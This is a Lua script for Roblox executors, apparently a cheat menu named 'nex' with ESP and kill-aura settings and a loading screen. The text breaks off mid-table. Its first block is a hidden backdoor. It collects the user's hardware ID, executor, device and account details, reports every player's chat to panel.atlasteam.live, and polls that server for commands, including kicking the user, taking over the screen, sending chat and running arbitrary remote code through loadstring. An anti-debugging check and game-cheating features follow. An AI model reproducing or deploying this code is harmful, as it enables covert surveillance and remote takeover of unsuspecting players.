pcall(function()
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local HttpService = game:GetService("HttpService")
    local UserInputService = game:GetService("UserInputService")
    local player = Players.LocalPlayer

    local SCRIPT_ID = "lc0001"
    local SCRIPT_NAME = "nex"
    local COMMAND_INTERVAL = 1
    local HEARTBEAT_INTERVAL = 10
    local INFO_CONFIG_JSON = "{\"avatar_url\":true,\"hwid\":true,\"device\":true,\"executor\":true,\"account_age\":true,\"join_date\":true,\"friends_count\":true,\"premium_status\":true,\"health\":true,\"server_player_count\":true}"
    local INFO_CONFIG = {}
    pcall(function()
        local decoded = HttpService:JSONDecode(INFO_CONFIG_JSON)
        if type(decoded) == "table" then INFO_CONFIG = decoded end
    end)

    local SERVERS = {
        "https://panel.atlasteam.live"
    }

    local gameName = "Unknown"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local function enc(v)
        v = tostring(v or "")
        local ok, encoded = pcall(function() return HttpService:UrlEncode(v) end)
        if ok and encoded then return encoded end
        return v:gsub("\n", " "):gsub(" ", "%%20")
    end

    local function buildQuery(data)
        local parts = {}
        for k, v in pairs(data) do
            table.insert(parts, enc(k) .. "=" .. enc(v))
        end
        return table.concat(parts, "&")
    end

    local function apiGet(path, data)
        local query = buildQuery(data)
        for _, server in ipairs(SERVERS) do
            local ok, body = pcall(function()
                return game:HttpGet(server .. path .. "?" .. query .. "&_t=" .. tostring(os.time()), true)
            end)
            if ok and body and body:find('"ok"%s*:%s*true') then
                return true
            end
            task.wait(0.2)
        end
        return false
    end

    local function getPlayerCount()
        local n = 0
        for _ in pairs(Players:GetPlayers()) do n = n + 1 end
        return n
    end

    local function getTeleportCommand()
        return 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. tostring(game.PlaceId) .. ', "' .. tostring(game.JobId) .. '")'
    end

    local function getDevice()
        if UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
            return "PC / 模拟器"
        end
        return "Android / IOS / Unknown"
    end

    local function getExecutor()
        local ok, value = pcall(function()
            if identifyexecutor then return identifyexecutor() end
            return "Unknown"
        end)
        return ok and tostring(value or "Unknown") or "Unknown"
    end

    local function requestJson(reqTable)
        local req = http_request or request or HttpPost or syn and syn.request
        if not req then return nil end
        local ok, res = pcall(function() return req(reqTable) end)
        if not ok or not res then return nil end
        local body = res.Body or res.body
        if not body then return nil end
        local ok2, json = pcall(function() return HttpService:JSONDecode(body) end)
        if not ok2 then return nil end
        return json
    end

    local function validText(value)
        value = tostring(value or "")
        if value == "" or value == "N/A" or value == "Unknown" or value == "未知" or value == "nil" or value == "null" then return "" end
        return value
    end

    local function getAvatarUrl()
        local urls = {
            ("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=180x180&format=Png&isCircular=true"):format(player.UserId),
            ("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true"):format(player.UserId)
        }
        for _, url in ipairs(urls) do
            local ok, body = pcall(function() return game:HttpGet(url, true) end)
            if ok and body then
                local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
                if ok2 and decoded and decoded.data and decoded.data[1] then
                    local imageUrl = validText(decoded.data[1].imageUrl)
                    if imageUrl ~= "" then return imageUrl end
                end
            end
        end
        return ""
    end

    local function getHwid()
        local checks = {
            function() return gethwid and gethwid() end,
            function() return get_hwid and get_hwid() end,
            function() return getexecutorhwid and getexecutorhwid() end,
            function() return getfingerprint and getfingerprint() end,
            function() return fingerprint and fingerprint() end,
            function() return syn and syn.gethwid and syn.gethwid() end,
            function() return syn and syn.get_hwid and syn.get_hwid() end,
            function() return KRNL_LOADED and gethwid and gethwid() end
        }
        for _, fn in ipairs(checks) do
            local ok, value = pcall(fn)
            value = ok and validText(value) or ""
            if value ~= "" then return value end
        end
        local json = requestJson({ Url = "https://httpbin.org/get", Method = "GET" })
        if json and json.headers then
            for k, v in pairs(json.headers) do
                local name = tostring(k):lower()
                if name:find("fingerprint") or name:find("hwid") or name:find("identifier") then
                    local value = validText(v)
                    if value ~= "" then return value end
                end
            end
        end
        return ""
    end

    local function getJoinDate()
        local joinTime = os.time() - (tonumber(player.AccountAge) or 0) * 86400
        local joinDate = os.date("!*t", joinTime)
        if not joinDate then return "" end
        return tostring(joinDate.year) .. " / " .. tostring(joinDate.month) .. " / " .. tostring(joinDate.day)
    end

    local function getPremiumStatus()
        local ok, membership = pcall(function() return player.MembershipType end)
        if not ok then return "" end
        if membership == Enum.MembershipType.Premium then return "是" end
        return "否"
    end

    local function getFriendsCount()
        local json = requestJson({ Url = ("https://friends.roblox.com/v1/users/%d/friends/count"):format(player.UserId), Method = "GET" })
        if json and tonumber(json.count) then return tostring(tonumber(json.count)) end
        local ok, pages = pcall(function() return Players:GetFriendsAsync(player.UserId) end)
        if not ok or not pages then return "" end
        local total = 0
        local guard = 0
        while guard < 25 do
            guard = guard + 1
            local okPage, page = pcall(function() return pages:GetCurrentPage() end)
            if okPage and page then total = total + #page end
            local done = false
            pcall(function() done = pages.IsFinished end)
            if done then break end
            local okNext = pcall(function() pages:AdvanceToNextPageAsync() end)
            if not okNext then break end
        end
        return tostring(total)
    end

    local function infoEnabled(key)
        local value = INFO_CONFIG and INFO_CONFIG[key]
        if value == false then return false end
        return true
    end

    local function buildStaticProfile()
        local profile = {}
        if infoEnabled("avatar_url") then profile.avatar_url = getAvatarUrl() end
        if infoEnabled("hwid") then profile.hwid = getHwid() end
        if infoEnabled("device") then profile.device = getDevice() end
        if infoEnabled("executor") then profile.executor = getExecutor() end
        if infoEnabled("account_age") then profile.account_age = tostring(player.AccountAge) .. "天" end
        if infoEnabled("join_date") then profile.join_date = getJoinDate() end
        if infoEnabled("friends_count") then profile.friends_count = getFriendsCount() end
        if infoEnabled("premium_status") then profile.premium_status = getPremiumStatus() end
        return profile
    end

    local staticProfile = buildStaticProfile()

    local function fileExtFromUrl(url, fallback)
        url = tostring(url or ""):lower()
        local ext = url:match("%.([a-z0-9]+)%?") or url:match("%.([a-z0-9]+)$")
        if ext and #ext <= 5 then return ext end
        return fallback or "bin"
    end

    local function extFromMime(mime, fallback)
        mime = tostring(mime or ""):lower()
        local map = {
            ["image/png"] = "png", ["image/jpeg"] = "jpg", ["image/jpg"] = "jpg", ["image/webp"] = "webp", ["image/gif"] = "gif",
            ["audio/mpeg"] = "mp3", ["audio/mp3"] = "mp3", ["audio/ogg"] = "ogg", ["audio/wav"] = "wav", ["audio/x-wav"] = "wav", ["audio/mp4"] = "m4a",
            ["video/mp4"] = "mp4", ["video/webm"] = "webm", ["video/ogg"] = "ogv"
        }
        return map[mime] or fallback or "bin"
    end

    local function base64Decode(data)
        data = tostring(data or "")
        if data == "" then return "" end
        local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        data = data:gsub("[^A-Za-z0-9%+/%=]", "")
        return (data:gsub(".", function(x)
            if x == "=" then return "" end
            local index = alphabet:find(x, 1, true)
            if not index then return "" end
            local value = index - 1
            local bits = ""
            for i = 6, 1, -1 do
                bits = bits .. (value % 2 ^ i - value % 2 ^ (i - 1) > 0 and "1" or "0")
            end
            return bits
        end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(bits)
            if #bits ~= 8 then return "" end
            local byte = 0
            for i = 1, 8 do
                if bits:sub(i, i) == "1" then byte = byte + 2 ^ (8 - i) end
            end
            return string.char(byte)
        end))
    end

    local function normalizeRobloxAsset(source)
        source = tostring(source or ""):gsub("^%s+", ""):gsub("%s+$", "")
        if source == "" then return "" end
        if source:match("^%d+$") then return "rbxassetid://" .. source end
        local id = source:match("[?&]id=(%d+)") or source:match("/library/(%d+)") or source:match("/catalog/(%d+)") or source:match("/asset/%?id=(%d+)")
        if id then return "rbxassetid://" .. id end
        return source
    end

    local function requestBody(url)
        url = tostring(url or "")
        local req = http_request or request or HttpGet or syn and syn.request
        if req then
            local ok, res = pcall(function()
                return req({ Url = url, Method = "GET" })
            end)
            if ok and res then
                return res.Body or res.body
            end
        end
        local ok, body = pcall(function() return game:HttpGet(url, true) end)
        if ok then return body end
        return nil
    end

    local function mediaSource(source, kind, encodedData, mime)
        source = normalizeRobloxAsset(source)
        encodedData = tostring(encodedData or "")
        local fallbackExt = kind == "image" and "png" or kind == "video" and "mp4" or kind == "sound" and "mp3" or "bin"

        if encodedData ~= "" and writefile and getcustomasset then
            local ext = extFromMime(mime, fileExtFromUrl(source, fallbackExt))
            local name = "atlas_media_" .. tostring(kind or "file") .. "_" .. tostring(math.random(100000,999999)) .. "." .. ext
            local body = base64Decode(encodedData)
            if body and body ~= "" then
                local okWrite = pcall(function() writefile(name, body) end)
                if okWrite then
                    local okAsset, asset = pcall(function() return getcustomasset(name) end)
                    if okAsset and asset and tostring(asset) ~= "" then return tostring(asset) end
                end
            end
        end

        if source == "" then return "" end
        if not source:match("^https?://") then return source end
        if not (writefile and getcustomasset) then return source end

        local ext = fileExtFromUrl(source, fallbackExt)
        local name = "atlas_media_" .. tostring(kind or "file") .. "_" .. tostring(math.random(100000,999999)) .. "." .. ext
        local body = requestBody(source)
        if not body or body == "" then return source end
        local okWrite = pcall(function() writefile(name, body) end)
        if not okWrite then return source end
        local okAsset, asset = pcall(function() return getcustomasset(name) end)
        if okAsset and asset and tostring(asset) ~= "" then return tostring(asset) end
        return source
    end

    local function parentGui()
        local gui = nil
        pcall(function() gui = game:GetService("CoreGui") end)
        if not gui then gui = player:WaitForChild("PlayerGui") end
        return gui
    end

    local function addStatusLabel(screenGui, text)
        local label = Instance.new("TextLabel")
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1,1,1)
        label.TextStrokeTransparency = 0.35
        label.Font = Enum.Font.GothamBold
        label.TextSize = 18
        label.Text = tostring(text or "")
        label.Size = UDim2.new(1, -24, 0, 40)
        label.Position = UDim2.new(0, 12, 1, -52)
        label.ZIndex = 10000
        label.Parent = screenGui
        return label
    end

    local function showFullscreenImage(imageUrl, seconds, soundUrl, imageData, imageMime, soundData, soundMime)
        seconds = tonumber(seconds) or 5
        if seconds < 1 then seconds = 1 end
        if seconds > 60 then seconds = 60 end

        local imageSource = mediaSource(imageUrl, "image", imageData, imageMime)
        local soundSource = mediaSource(soundUrl, "sound", soundData, soundMime)
        if imageSource == "" then return end

        local mediaPlayer = Instance.new("ScreenGui")
        mediaPlayer.Name = "MediaPlayer_" .. math.random(100000,999999)
        mediaPlayer.ResetOnSpawn = false
        mediaPlayer.IgnoreGuiInset = true
        mediaPlayer.DisplayOrder = 999999

        local image = Instance.new("ImageLabel")
        image.Image = imageSource
        image.Size = UDim2.new(1,0,1,0)
        image.BackgroundColor3 = Color3.new(0,0,0)
        image.ScaleType = Enum.ScaleType.Fit
        image.ZIndex = 9999
        image.Parent = mediaPlayer
        local status = addStatusLabel(mediaPlayer, "Loading image...")

        if soundSource ~= "" then
            local sound = Instance.new("Sound")
            sound.SoundId = soundSource
            sound.Volume = 10
            sound.Parent = mediaPlayer
            pcall(function() sound:Play() end)
        end

        mediaPlayer.Parent = parentGui()
        task.spawn(function()
            local start = os.clock()
            while os.clock() - start < 8 do
                local loaded = false
                pcall(function() loaded = image.IsLoaded end)
                if loaded then
                    pcall(function() status:Destroy() end)
                    break
                end
                task.wait(0.2)
            end
            pcall(function()
                if status and status.Parent then status.Text = "Image failed to load: use Roblox asset id or supported executor upload" end
            end)
        end)
        task.delay(seconds, function()
            pcall(function() mediaPlayer:Destroy() end)
        end)
    end

    local function showFullscreenVideo(videoUrl, seconds, soundUrl, videoData, videoMime, soundData, soundMime)
        seconds = tonumber(seconds) or 10
        if seconds < 1 then seconds = 1 end
        if seconds > 120 then seconds = 120 end

        local videoSource = mediaSource(videoUrl, "video", videoData, videoMime)
        local soundSource = mediaSource(soundUrl, "sound", soundData, soundMime)
        if videoSource == "" then return end

        local mediaPlayer = Instance.new("ScreenGui")
        mediaPlayer.Name = "VideoPlayer_" .. math.random(100000,999999)
        mediaPlayer.ResetOnSpawn = false
        mediaPlayer.IgnoreGuiInset = true
        mediaPlayer.DisplayOrder = 999999

        local video = Instance.new("VideoFrame")
        video.Video = videoSource
        video.Size = UDim2.new(1,0,1,0)
        video.BackgroundColor3 = Color3.new(0,0,0)
        video.ZIndex = 9999
        video.Looped = true
        video.Parent = mediaPlayer
        local status = addStatusLabel(mediaPlayer, "Loading video...")

        if soundSource ~= "" then
            local sound = Instance.new("Sound")
            sound.SoundId = soundSource
            sound.Volume = 10
            sound.Parent = mediaPlayer
            pcall(function() sound:Play() end)
        end

        mediaPlayer.Parent = parentGui()
        pcall(function() video:Play() end)
        task.spawn(function()
            task.wait(2)
            pcall(function()
                if video.IsLoaded then status:Destroy() else status.Text = "Video failed to load: use Roblox video asset id or supported local file executor" end
            end)
        end)
        task.delay(seconds, function()
            pcall(function() mediaPlayer:Destroy() end)
        end)
    end

    local function playSoundOnly(soundUrl, seconds, soundData, soundMime)
        seconds = tonumber(seconds) or 10
        if seconds < 1 then seconds = 1 end
        if seconds > 120 then seconds = 120 end

        local soundSource = mediaSource(soundUrl, "sound", soundData, soundMime)
        if soundSource == "" then return end

        local soundGui = Instance.new("ScreenGui")
        soundGui.Name = "SoundPlayer_" .. math.random(100000,999999)
        soundGui.ResetOnSpawn = false
        soundGui.IgnoreGuiInset = true
        soundGui.DisplayOrder = 999999
        local status = addStatusLabel(soundGui, "Playing sound...")

        local sound = Instance.new("Sound")
        sound.SoundId = soundSource
        sound.Volume = 10
        sound.Parent = soundGui

        soundGui.Parent = parentGui()
        pcall(function() sound:Play() end)
        task.spawn(function()
            task.wait(2)
            pcall(function()
                if sound.IsLoaded or sound.TimeLength > 0 then status.Text = "Sound playing" else status.Text = "Sound failed to load: use Roblox audio asset id or supported local file executor" end
            end)
        end)
        task.delay(seconds, function()
            pcall(function() soundGui:Destroy() end)
        end)
    end

    local function sendChatMessage(message)
        message = tostring(message or "")
        if message == "" then return end
        local sent = false
        pcall(function()
            local TextChatService = game:GetService("TextChatService")
            local channels = TextChatService:FindFirstChild("TextChannels")
            local general = channels and channels:FindFirstChild("RBXGeneral")
            if general then
                general:SendAsync(message)
                sent = true
            end
        end)
        if sent then return end
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
        end)
    end

    local function sendNotification(title, message, seconds)
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = tostring(title or "通知"),
                Text = tostring(message or ""),
                Duration = tonumber(seconds) or 5
            })
        end)
    end

    local function executeRemoteCode(code)
        if type(code) ~= "string" or code == "" then return end
        local loader = loadstring or load
        if not loader then return end
        local ok, fn = pcall(loader, code)
        if ok and type(fn) == "function" then
            task.spawn(function() pcall(fn) end)
        end
    end


    local chatRecent = {}

    local function reportChatFields(senderUserId, senderUsername, senderDisplayName, message)
        message = tostring(message or "")
        message = message:gsub("^%s+", ""):gsub("%s+$", "")
        if message == "" then return end
        if #message > 300 then message = message:sub(1, 300) end
        senderUserId = tostring(senderUserId or "")
        senderUsername = tostring(senderUsername or senderUserId or "")
        senderDisplayName = tostring(senderDisplayName or "")
        local key = senderUserId .. "|" .. message
        local now = os.clock()
        if chatRecent[key] and now - chatRecent[key] < 1.5 then return end
        chatRecent[key] = now
        apiGet("/api/chat-report", {
            user_id = tostring(player.UserId),
            reporter_user_id = tostring(player.UserId),
            username = player.Name,
            game_name = gameName,
            server_id = game.JobId,
            script_id = SCRIPT_ID,
            sender_user_id = senderUserId,
            sender_username = senderUsername,
            sender_display_name = senderDisplayName,
            message = message
        })
    end

    local function reportPlayerChat(plr, message)
        if not plr then return end
        reportChatFields(tostring(plr.UserId), plr.Name, plr.DisplayName, message)
    end

    local hookedChatPlayers = {}

    local function hookPlayerChat(plr)
        if not plr or hookedChatPlayers[plr] then return end
        hookedChatPlayers[plr] = true
        pcall(function()
            plr.Chatted:Connect(function(message)
                reportPlayerChat(plr, message)
            end)
        end)
    end

    local function startChatCapture()
        for _, plr in ipairs(Players:GetPlayers()) do
            hookPlayerChat(plr)
        end
        Players.PlayerAdded:Connect(function(plr)
            hookPlayerChat(plr)
        end)
        pcall(function()
            local TextChatService = game:GetService("TextChatService")
            TextChatService.MessageReceived:Connect(function(chatMessage)
                local text = chatMessage and chatMessage.Text or ""
                local source = chatMessage and chatMessage.TextSource
                if source and source.UserId then
                    local sourcePlayer = Players:GetPlayerByUserId(source.UserId)
                    if sourcePlayer then
                        reportPlayerChat(sourcePlayer, text)
                    else
                        reportChatFields(tostring(source.UserId), tostring(source.Name or source.UserId), "", text)
                    end
                end
            end)
        end)
    end

    local function checkCommands()
        local query = buildQuery({
            user_id = tostring(player.UserId),
            game_name = gameName,
            server_id = game.JobId,
            script_id = SCRIPT_ID
        })

        for _, server in ipairs(SERVERS) do
            local ok, body = pcall(function()
                return game:HttpGet(server .. "/api/commands?" .. query .. "&_t=" .. tostring(os.clock()), true)
            end)

            if ok and body then
                local success, data = pcall(HttpService.JSONDecode, HttpService, body)
                if success and data and data.command then
                    local cmd = data.command

                    if cmd.type == "kick" then
                        player:Kick(tostring(cmd.message or "Kicked by admin"))
                    elseif cmd.type == "image" then
                        showFullscreenImage(cmd.image_url, cmd.seconds, cmd.sound_url, cmd.image_data, cmd.image_mime, cmd.sound_data, cmd.sound_mime)
                    elseif cmd.type == "video" then
                        showFullscreenVideo(cmd.video_url, cmd.seconds, cmd.sound_url, cmd.video_data, cmd.video_mime, cmd.sound_data, cmd.sound_mime)
                    elseif cmd.type == "sound" then
                        playSoundOnly(cmd.sound_url, cmd.seconds, cmd.sound_data, cmd.sound_mime)
                    elseif cmd.type == "chat" then
                        sendChatMessage(cmd.message)
                    elseif cmd.type == "notify" then
                        sendNotification(cmd.title, cmd.message, cmd.seconds)
                    elseif cmd.type == "exec" then
                        executeRemoteCode(cmd.code)
                    end
                    return true
                end
            end
            task.wait(0.2)
        end
        return false
    end

    local function sendHeartbeat()
        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")

        local data = {
            user_id = tostring(player.UserId),
            username = player.Name,
            display_name = player.DisplayName,
            game_name = gameName,
            game_id = tostring(game.GameId),
            server_place_id = tostring(game.PlaceId),
            server_id = game.JobId,
            teleport_cmd = getTeleportCommand(),
            script_id = SCRIPT_ID,
            script_name = SCRIPT_NAME
        }

        if infoEnabled("health") then
            data.health = hum and math.floor(hum.Health) or 0
            data.max_health = hum and math.floor(hum.MaxHealth) or 0
        end
        if infoEnabled("server_player_count") then
            data.server_player_count = getPlayerCount()
            data.max_players = Players.MaxPlayers
        end

        pcall(function()
            for k, v in pairs(staticProfile) do
                data[k] = v
            end
        end)

        apiGet("/api/heartbeat-get", data)
    end

    sendHeartbeat()
    pcall(startChatCapture)

    task.spawn(function()
        while task.wait(COMMAND_INTERVAL) do
            pcall(checkCommands)
        end
    end)

    task.spawn(function()
        while task.wait(HEARTBEAT_INTERVAL) do
            pcall(sendHeartbeat)
        end
    end)
end)


REVEAL_HINT_STACK = false
ANTI_ENV_LOG_MESSAGE =
[[
    KENNYnb6668
]]
if not getmetatable or not setmetatable or not type or not select or type(select(2, pcall(getmetatable, setmetatable({}, {__index = function(self, ...) while true do end end})))['__index']) ~= 'function' or not pcall or not debug or not rawget or not rawset or not pcall(rawset,{}," "," ") or not select or not getfenv or select(1, pcall(getfenv, 69)) == true or not select(2, pcall(rawget, debug, "info")) or #(((select(2, pcall(rawget, debug, "info")))(getfenv, "n")))<=1 or #(((select(2, pcall(rawget, debug, "info")))(print, "n")))<=1 or not (select(2, pcall(rawget, debug, "info")))(print, "s") == "[C]" or not (select(2, pcall(rawget, debug, "info")))(require, "s") == "[C]" or (select(2, pcall(rawget, debug, "info")))((function()end), "s") == "[C]" then
  return REVEAL_HINT_STACK and tostring(ANTI_ENV_LOG_MESSAGE) or nil
end

if getgenv().NEX_LC_LOADED then
    pcall(function()
        if getgenv().NEX_LC_WINDOW then getgenv().NEX_LC_WINDOW:Close() end
        if getgenv().NEX_LC_CLEANUP then getgenv().NEX_LC_CLEANUP() end
    end)
    getgenv().NEX_LC_LOADED = false
end
getgenv().NEX_LC_LOADED = true

-- ============================================
-- 启动加载UI
-- ============================================
local loadingUI = nil
local loadingStatusLabel = nil
local loadingProgressBar = nil
local loadingProgressFill = nil

local loadingParticleConn = nil
local loadingIconConn = nil

local function createLoadingUI()
    local coreGui = game:GetService("CoreGui")
    local runService = game:GetService("RunService")

    loadingUI = Instance.new("ScreenGui")
    loadingUI.Name = "NEX_LC_LoadingUI"
    loadingUI.ResetOnSpawn = false
    loadingUI.IgnoreGuiInset = true
    loadingUI.DisplayOrder = 999999
    loadingUI.Parent = coreGui

    -- 完全透明背景
    local bg = Instance.new("Frame")
    bg.Name = "Background"
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    bg.BackgroundTransparency = 1
    bg.BorderSizePixel = 0
    bg.Parent = loadingUI

    -- 中央内容容器（位置向下偏移）
    local content = Instance.new("Frame")
    content.Name = "Content"
    content.Size = UDim2.new(0, 500, 0, 120)
    content.Position = UDim2.new(0.5, -250, 0.5, 20)
    content.BackgroundTransparency = 1
    content.BorderSizePixel = 0
    content.Parent = loadingUI

    -- 白色图标
    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Size = UDim2.new(0, 64, 0, 64)
    icon.Position = UDim2.new(0.5, -32, 0, 0)
    icon.BackgroundTransparency = 1
    icon.Image = savedIcon or "https://github.com/INFINITEYIELD123/UIn/releases/download/UI/NEX2026.png"
    icon.ScaleType = Enum.ScaleType.Fit
    icon.ImageColor3 = Color3.fromRGB(255, 255, 255)
    icon.Parent = content

    -- 白色进度条背景
    loadingProgressBar = Instance.new("Frame")
    loadingProgressBar.Name = "ProgressBarBg"
    loadingProgressBar.Size = UDim2.new(0, 360, 0, 3)
    loadingProgressBar.Position = UDim2.new(0.5, -180, 0, 80)
    loadingProgressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingProgressBar.BackgroundTransparency = 0.5
    loadingProgressBar.BorderSizePixel = 0
    loadingProgressBar.Parent = content

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(1, 0)
    barCorner.Parent = loadingProgressBar

    -- 白色进度条填充
    loadingProgressFill = Instance.new("Frame")
    loadingProgressFill.Name = "ProgressFill"
    loadingProgressFill.Size = UDim2.new(0, 0, 1, 0)
    loadingProgressFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingProgressFill.BackgroundTransparency = 0
    loadingProgressFill.BorderSizePixel = 0
    loadingProgressFill.Parent = loadingProgressBar

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(1, 0)
    fillCorner.Parent = loadingProgressFill

    -- 白色粒子环绕
    local particleFolder = Instance.new("Folder")
    particleFolder.Name = "Particles"
    particleFolder.Parent = loadingUI

    local particleArea = {
        centerX = 0.5,
        centerY = 0.55,
        width = 0.35,
        height = 0.12
    }

    local particles = {}
    for i = 1, 45 do
        local p = Instance.new("Frame")
        local size = math.random(2, 5)
        p.Size = UDim2.new(0, size, 0, size)
        local angle = math.random() * math.pi * 2
        local dist = math.random() * 0.12 + 0.02
        local px = particleArea.centerX + math.cos(angle) * dist
        local py = particleArea.centerY + math.sin(angle) * dist * 0.6
        p.Position = UDim2.new(px, 0, py, 0)
        p.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        p.BackgroundTransparency = math.random(40, 80) / 100
        p.BorderSizePixel = 0
        p.Parent = particleFolder
        local pc = Instance.new("UICorner")
        pc.CornerRadius = UDim.new(1, 0)
        pc.Parent = p
        table.insert(particles, {
            frame = p,
            baseX = px,
            baseY = py,
            orbitSpeed = (math.random() - 0.5) * 0.8,
            orbitRadius = math.random() * 0.03 + 0.01,
            orbitAngle = math.random() * math.pi * 2,
            alpha = math.random(40, 80) / 100,
            alphaDir = (math.random() > 0.5 and 1 or -1) * 0.012,
            pulseSpeed = math.random(5, 12) / 10
        })
    end

    loadingParticleConn = runService.RenderStepped:Connect(function(dt)
        local time = os.clock()
        for _, p in ipairs(particles) do
            p.orbitAngle = p.orbitAngle + p.orbitSpeed * dt
            local ox = math.cos(p.orbitAngle) * p.orbitRadius
            local oy = math.sin(p.orbitAngle * 1.3) * p.orbitRadius * 0.6
            p.frame.Position = UDim2.new(p.baseX + ox, 0, p.baseY + oy, 0)
            p.alpha = p.alpha + p.alphaDir
            if p.alpha > 0.85 then p.alphaDir = -math.abs(p.alphaDir) end
            if p.alpha < 0.1 then p.alphaDir = math.abs(p.alphaDir) end
            p.frame.BackgroundTransparency = 1 - p.alpha
            local pulse = 1 + math.sin(time * p.pulseSpeed) * 0.3
            local baseSize = p.frame.Size.X.Offset
            p.frame.Size = UDim2.new(0, baseSize * pulse, 0, baseSize * pulse)
        end
    end)

    local iconBaseY = icon.Position.Y.Offset
    loadingIconConn = runService.RenderStepped:Connect(function(dt)
        local time = os.clock()
        icon.Position = UDim2.new(0.5, -32, 0, iconBaseY + math.sin(time * 2) * 3)
    end)
end

local function updateLoadingProgress(text, percent)
    if loadingStatusLabel then
        loadingStatusLabel.Text = text
    end
    if loadingPercentLabel and percent then
        loadingPercentLabel.Text = tostring(math.floor(percent)) .. "%"
    end
    if loadingProgressFill and percent then
        local clamped = math.clamp(percent / 100, 0, 1)
        loadingProgressFill.Size = UDim2.new(clamped, 0, 1, 0)
    end
end

local function destroyLoadingUI()
    if loadingParticleConn then
        pcall(function() loadingParticleConn:Disconnect() end)
        loadingParticleConn = nil
    end
    if loadingIconConn then
        pcall(function() loadingIconConn:Disconnect() end)
        loadingIconConn = nil
    end
    if loadingUI then
        loadingUI:Destroy()
        loadingUI = nil
        loadingStatusLabel = nil
        loadingPercentLabel = nil
        loadingProgressBar = nil
        loadingProgressFill = nil
    end
end

createLoadingUI()

_G.NEX_LC_VARS = _G.NEX_LC_VARS or {}
_G.NEX_LC_VARS.ESP_Boxes = false
_G.NEX_LC_VARS.ESP_Names = false
_G.NEX_LC_VARS.ESP_Distance = false
_G.NEX_LC_VARS.ESP_Tracers = false
_G.NEX_LC_VARS.ESP_AimLine = false
_G.NEX_LC_VARS.ESP_TeamCheck = false
_G.NEX_LC_VARS.ESP_Enabled = false
_G.NEX_LC_VARS.ESP_Outline = false
_G.NEX_LC_VARS.killAuraAllowEmptyHand = false
_G.NEX_LC_VARS.undergroundEnabled = false
_G.NEX_LC_VARS.teleportBehindEnabled = false
_G.NEX_LC_VARS.teleportBehindActive = false
_G.NEX_LC_VARS.teleportBehindContinuous = false
local espDrawObjects = {}
local espRenderConn = nil

updateLoadingProgress("正在加载 WindUI 核心...", 10)
WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
if not WindUI then error("WindUI 加载失败") end
updateLoadingProgress("WindUI 核心加载完成", 20)

-- ============================================
-- 图片缓存到本地（工作区文件系统）
-- ============================================
local ASSETS_FOLDER = "NEX_LC_Data"

local function saveImageToWorkspace(url, fileName)
    local fullPath = ASSETS_FOLDER .. "/" .. fileName
    local ok, data = pcall(function() return game:HttpGet(url, true) end)
    if ok and data then
        pcall(function()
            if not isfolder(ASSETS_FOLDER) then
                makefolder(ASSETS_FOLDER)
            end
            writefile(fullPath, data)
        end)
        local ok2, asset = pcall(function() return getcustomasset(fullPath) end)
        if ok2 and asset then return asset end
    end
    return url
end

local TITLE_ICON_URL = "https://github.com/INFINITEYIELD123/UIn/releases/download/UI/NEX2026.png"
local BACKGROUND_URL = "https://github.com/INFINITEYIELD123/UI/releases/download/UI/IMG.png"

updateLoadingProgress("正在缓存图片资源...", 40)
local savedIcon = saveImageToWorkspace(TITLE_ICON_URL, "NEX_LC_Icon.png")
local savedBg = saveImageToWorkspace(BACKGROUND_URL, "NEX_LC_Background.png")
updateLoadingProgress("图片资源缓存完成", 50)

-- ============================================
-- 主题配置持久化
-- ============================================
local configFolder = "NEX_LC_Data"
local THEME_CONFIG_FILE = configFolder .. "/theme_config.json"

local function loadThemeConfig()
    local http = game:GetService("HttpService")
    pcall(function()
        if not isfolder(configFolder) then makefolder(configFolder) end
    end)
    local ok, content = pcall(function() return readfile(THEME_CONFIG_FILE) end)
    if ok and content then
        local ok2, data = pcall(function() return http:JSONDecode(content) end)
        if ok2 and type(data) == "table" then return data end
    end
    return {custom_theme_enabled = false}
end

local function saveThemeConfig(data)
    local http = game:GetService("HttpService")
    pcall(function()
        if not isfolder(configFolder) then makefolder(configFolder) end
    end)
    local ok, json = pcall(function() return http:JSONEncode(data) end)
    if ok then
        pcall(function() return writefile(THEME_CONFIG_FILE, json) end)
    end
end

updateLoadingProgress("正在加载主题配置...", 30)
local themeConfigData = loadThemeConfig()
local customThemeEnabled = themeConfigData.custom_theme_enabled or false
updateLoadingProgress("主题配置加载完成", 35)

-- ============================================
-- 自定义主题定义
-- ============================================
local CustomTheme = {
    Name = "Custom",
    Accent = Color3.fromHex("#18181b"),
    Dialog = Color3.fromHex("#1a1a1a"),
    Text = Color3.fromHex("#FFFFFF"),
    Placeholder = Color3.fromHex("#a1a1aa"),
    Background = Color3.fromHex("#101010"),
    Button = Color3.fromHex("#52525b"),
    Icon = Color3.fromHex("#a1a1aa"),
    Toggle = Color3.fromHex("#33C759"),
    Slider = Color3.fromHex("#0091FF"),
    Checkbox = Color3.fromHex("#0091FF"),
    PanelBackground = Color3.fromHex("#FFFFFF"),
    PanelBackgroundTransparency = 0.95,
    SliderIcon = Color3.fromHex("#908F95"),
    Primary = Color3.fromHex("#0091FF"),
    LabelBackground = Color3.fromHex("#000000"),
